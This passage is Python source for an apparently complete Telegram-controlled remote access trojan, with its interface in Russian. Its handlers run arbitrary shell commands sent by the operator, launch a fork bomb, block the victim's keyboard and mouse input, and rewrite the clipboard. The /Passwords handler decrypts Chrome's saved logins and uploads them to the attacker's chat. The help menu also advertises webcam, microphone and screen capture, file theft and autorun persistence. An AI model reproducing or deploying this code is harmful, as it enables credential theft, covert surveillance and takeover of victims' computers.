  bot.send_message(command.chat.id, '*Введите сообщение\n\n› /Message*', parse_mode="Markdown")


@bot.message_handler(regexp='/OpenURL')
def OpenURL(command):
 try:
  URL = re.split('/OpenURL ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  OpenBrowser(URL)
  bot.reply_to(command, '*Ссылка открыта!*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Вставьте ссылку\n\n› /OpenURL*', parse_mode="Markdown")


@bot.message_handler(content_types=['photo'])
def Wallpapers(command):
 try:
  Photo = bot.get_file(command.photo[len(command.photo)-1].file_id)
  GetPhoto(Photo, command)
  SetWallpapers(Photo)
  bot.reply_to(command, '*Фотография установлена на обои!*', parse_mode="Markdown")
 except:
  bot.reply_to(command, '*Не удалось загрузить фотографию*', reply_markup=menu, parse_mode="Markdown")


@bot.message_handler(regexp='/Speak')
def Speak(command):
 try:
  Text = re.split('/Speak ', command.text, flags=re.I)[1]
  bot.reply_to(command, '*Воспроизводим...*', parse_mode="Markdown")
  try:
   SpeakText(Text)
   bot.send_message(command.chat.id, '*Готово!*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*Не удалось воспроизвести текст*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Введите текст\n\n› /Speak*', parse_mode="Markdown")


@bot.message_handler(regexp='/ForkBomb')
def Forkbomb(command):
 bot.send_message(command.chat.id, '*Форкбомба активирована!*', parse_mode="Markdown")
 ForkBomb()


@bot.message_handler(regexp='/Passwords')
def Passwords(command):
 try:
  from cryptography.hazmat.backends import default_backend
  from cryptography.hazmat.primitives.ciphers import (
      Cipher, algorithms, modes)

  NONCE_BYTE_SIZE = 12

  def encrypt(cipher, plaintext, nonce):
      cipher.mode = modes.GCM(nonce)
      encryptor = cipher.encryptor()
      ciphertext = encryptor.update(plaintext)
      return (cipher, ciphertext, nonce)

  def decrypt(cipher, ciphertext, nonce):
      cipher.mode = modes.GCM(nonce)
      decryptor = cipher.decryptor()
      return decryptor.update(ciphertext)

  def get_cipher(key):
      cipher = Cipher(
          algorithms.AES(key),
          None,
          backend=default_backend()
      )
      return cipher

  APP_DATA_PATH= os.environ['LOCALAPPDATA']
  DB_PATH = r'Google\Chrome\User Data\Default\Login Data'

  def dpapi_decrypt(encrypted):
      class DATA_BLOB(ctypes.Structure):
          _fields_ = [('cbData', ctypes.wintypes.DWORD),
                      ('pbData', ctypes.POINTER(ctypes.c_char))]

      p = ctypes.create_string_buffer(encrypted, len(encrypted))
      blobin = DATA_BLOB(ctypes.sizeof(p), p)
      blobout = DATA_BLOB()
      retval = ctypes.windll.crypt32.CryptUnprotectData(
          ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
      if not retval:
          raise ctypes.WinError()
      result = ctypes.string_at(blobout.pbData, blobout.cbData)
      ctypes.windll.kernel32.LocalFree(blobout.pbData)
      return result

  def unix_decrypt(encrypted):
      if sys.platform.startswith('linux'):
          password = 'peanuts'
          iterations = 1
      else:
          raise NotImplementedError

      from Crypto.Cipher import AES
      from Crypto.Protocol.KDF import PBKDF2

      salt = 'saltysalt'
      iv = ' ' * 16
      length = 16
      key = PBKDF2(password, salt, length, iterations)
      cipher = AES.new(key, AES.MODE_CBC, IV=iv)
      decrypted = cipher.decrypt(encrypted[3:])
      return decrypted[:-ord(decrypted[-1])]

  def get_key_from_local_state():
      jsn = None
      with open(os.path.join(os.environ['LOCALAPPDATA'],
          r"Google\Chrome\User Data\Local State"),encoding='utf-8',mode ="r") as f:
          jsn = json.loads(str(f.readline()))
      return jsn["os_crypt"]["encrypted_key"]

  def aes_decrypt(encrypted_txt):
      encoded_key = get_key_from_local_state()
      encrypted_key = base64.b64decode(encoded_key.encode())
      encrypted_key = encrypted_key[5:]
      key = dpapi_decrypt(encrypted_key)
      nonce = encrypted_txt[3:15]
      cipher = get_cipher(key)
      return decrypt(cipher,encrypted_txt[15:],nonce)

  class ChromePassword:
      def __init__(self):
          self.passwordList = []

      def get_chrome_db(self):
          _full_path = os.path.join(APP_DATA_PATH,DB_PATH)
          _temp_path = os.path.join(APP_DATA_PATH,'sqlite_file')
          if os.path.exists(_temp_path):
              os.remove(_temp_path)
          shutil.copyfile(_full_path,_temp_path)
          self.show_password(_temp_path)

      def show_password(self,db_file):
          conn = sqlite3.connect(db_file)
          _sql = 'select signon_realm,username_value,password_value from logins'
          for row in conn.execute(_sql):
              host = row[0]
              if host.startswith('android'):
                  continue
              name = row[1]
              value = self.chrome_decrypt(row[2])
              _info = 'Hostname: %s\nUsername: %s\nPassword: %s\n\n' %(host,name,value)
              self.passwordList.append(_info)
          conn.close()
          os.remove(db_file)

      def chrome_decrypt(self,encrypted_txt):
          if sys.platform == 'win32':
              try:
                  if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                      decrypted_txt = dpapi_decrypt(encrypted_txt)
                      return decrypted_txt.decode()
                  elif encrypted_txt[:3] == b'v10':
                      decrypted_txt = aes_decrypt(encrypted_txt)
                      return decrypted_txt[:-16].decode()
              except WindowsError:
                  return None
          else:
              try:
                  return unix_decrypt(encrypted_txt)
              except NotImplementedError:
                  return None

      def save_passwords(self):
          with open(Temp+'Passwords.txt','w',encoding='utf-8') as f:
              f.writelines(self.passwordList)

  if __name__=="__main__":
      Main = ChromePassword()
      Main.get_chrome_db()
      Main.save_passwords()
      try:
       bot.send_chat_action(command.chat.id, 'upload_document')
       passwords = open(Temp+'\\Passwords.txt')
       bot.send_document(command.chat.id, passwords)
      except:
       pass
 except:
  bot.send_message(command.chat.id, '*Паролей не найдено*', parse_mode="Markdown")


@bot.message_handler(regexp='/Clipboard')
def Clipboard(command):
 try:
  Text = re.split('/Clipboard ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  SetClipboard(Text)
  bot.send_message(command.chat.id, '*Содержание буфера обмена изменено!*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id,
  '*Введите текст'
  '\n'
  '\n› /Clipboard'
  '\n'
  '\nБуфер обмена*'
  '\n'
  '\n`'+GetClipboard()+'`',
  parse_mode="Markdown")


@bot.message_handler(regexp='/Freeze')
def Freeze(command):
 try:
  admin = os.getuid() == 0
 except AttributeError:
  admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 if admin is False:
  bot.send_message(command.chat.id, '*Эта функция требует прав администратора!*', parse_mode="Markdown")
 if admin is True:
  try:
   Seconds = re.split('/Freeze ', command.text, flags=re.I)[1]
   bot.send_message(command.chat.id, '*Ввод заблокирован на '+Seconds+' секунд!*', parse_mode="Markdown")
   Block(float(Seconds))
   bot.send_message(command.chat.id, '*Ввод разблокирован!*', parse_mode="Markdown")
  except ValueError:
   bot.send_message(command.chat.id, '*Ошибка значения*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*Укажите длительность блокировки\n\n› /Freeze*', parse_mode="Markdown")


@bot.message_handler(regexp='/CMD')
def CMD(command):
 try:
  shell = re.split('/CMD ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  cmd = subprocess.Popen(shell, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
  lines = []
  for line in cmd.stdout.readlines():
      line = line.strip()
      if line:
          lines.append(line.decode('cp866'))
  bot.send_message(command.chat.id, ('\n'.join(lines)))
 except:
  bot.send_message(command.chat.id, '*Введите команду\n\n› /CMD*', parse_mode="Markdown")


@bot.message_handler(commands=['3', '6'])
def Main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=menu, parse_mode="Markdown")

@bot.message_handler(commands=['2', '5'])
def Main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode="Markdown")

@bot.message_handler(commands=['4', '1'])
def Main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode="Markdown")

@bot.message_handler(commands=['Power', 'power'])
def Power(command):
 bot.send_message(command.chat.id, '*Выберите действие*', reply_markup=main2, parse_mode="Markdown")

@bot.message_handler(commands=['Autorun', 'autorun'])
def Autorun(command):
 bot.send_message(command.chat.id, '*Выберите действие*', reply_markup=main3, parse_mode="Markdown")

@bot.message_handler(commands=['Files', 'files'])
def Files(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main7, parse_mode="Markdown")

@bot.message_handler(commands=['Cancel'])
def CancelFiles(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode="Markdown")

@bot.message_handler(commands=['Wallpapers', 'wallpapers'])
def Wallpapers(command):
 bot.send_message(command.chat.id, '*Отправьте фотографию*', parse_mode="Markdown")

@bot.message_handler(commands=['Help', 'help'])
def Help(command):
 bot.send_message(command.chat.id,
  'ᅠᅠᅠᅠ  ⚙️ *Команды* ⚙️'
  '\n'
  '\n'
  '\n*/Screen* -  Скриншот экрана'
  '\n*/Webcam* - Фото с вебки'
  '\n*/Video* - Видео с вебки'
  '\n*/Audio* - Запись микрофона'
  '\n*/Power* - Управление питанием'
  '\n*/Autorun* - Автозагрузка'
  '\n'
  '\n*/Files* - Файловый менеджер'
  '\n› */CD* - Текущая директория'
  '\n› */ls* - Список файлов'
  '\n› */Remove* - Удалить файл'
  '\n› */Upload* - Загрузить файл'
  '\n› */Download* - Скачать файл'
  '\n› */Run* - Запустить файл'
  '\n*/Tasklist* - Список процессов'
  '\n*/Taskkill* - Остановить процесс'
  '\n'
  '\n*/Message* - Отправить сообщение'
  '\n*/Speak* - Озвучить сообщение'
  '\n*/OpenURL* - Открыть ссылку'
  '\n*/Wallpapers* - Установить обои'
  '\n*/ForkBomb* - Запуск программ'
  '\n'
  '\n*/Passwords* - Получить пароли'
  '\n*/Clipboard* - Буфер обмена'
  '\n*/Freeze* - Блокировка ввода'
  '\n*/CMD* - Выполнить команду'
  '\n'
  '\n'
  '\n*Coded by Bainky | @bainki 👾*', 
  reply_markup=menu, parse_mode="Markdown")


try:
 bot.polling(Argument)
except:
 os.startfile(CurrentPath)
 sys.exit()
